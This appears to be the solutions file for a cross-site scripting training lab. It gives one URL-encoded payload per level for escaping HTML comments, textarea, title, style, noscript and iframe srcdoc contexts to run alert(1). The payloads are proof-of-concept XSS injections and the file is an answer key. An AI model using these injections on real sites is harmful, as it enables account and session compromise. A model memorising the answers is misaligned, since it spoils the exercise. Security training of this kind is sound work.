# ctxv2 — solutions

Reflection inside raw-text HTML elements (comment / textarea / title / style / noscript) and inside iframe srcdoc.

### ctxv2-level1

`/ctxv2/level1/?query=--%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `--><script>alert(1)</script>`
- context: inside HTML comment — close with -->

### ctxv2-level2

`/ctxv2/level2/?query=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</textarea><script>alert(1)</script>`
- context: inside <textarea> raw-text — close tag then inject

### ctxv2-level3

`/ctxv2/level3/?query=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</title><script>alert(1)</script>`
- context: inside <title> raw-text — close tag then inject

### ctxv2-level4

`/ctxv2/level4/?query=%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</style><script>alert(1)</script>`
- context: inside <style> — close tag then inject

### ctxv2-level5

`/ctxv2/level5/?query=%3C/noscript%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</noscript><script>alert(1)</script>`
- context: inside <noscript> — close tag then inject (parser treats as raw text)

### ctxv2-level6

`/ctxv2/level6/?query=%26lt;script%26gt;alert(1)%26lt;/script%26gt;`

- payload: `&lt;script&gt;alert(1)&lt;/script&gt;`
- context: iframe srcdoc — server encodes < > but not &; entities decode inside srcdoc HTML
